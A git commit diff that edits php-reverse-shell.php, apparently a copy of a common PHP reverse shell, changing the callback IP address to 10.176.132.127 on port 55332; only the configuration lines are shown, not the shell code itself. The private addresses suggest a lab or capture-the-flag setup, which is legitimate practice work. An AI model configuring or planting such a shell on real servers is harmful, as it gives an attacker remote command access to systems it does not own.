99507956c4d7bd87b76ca900a3276b3724b276fe
ClancyHeyworth <112170721+ClancyHeyworth@users.noreply.github.com>
2024-05-03 07:46:23 +1000

    Update php-reverse-shell.php

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -47,8 +47,8 @@
 set_time_limit (0);
 $VERSION = "1.0";
 //$ip = '127.0.0.1';  // CHANGE THIS
-//$ip = '192.168.137.128';
-$ip = '10.176.132.84';
+//$ip = '10.176.132.84';
+$ip = '10.176.132.127';
 $port = 55332;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
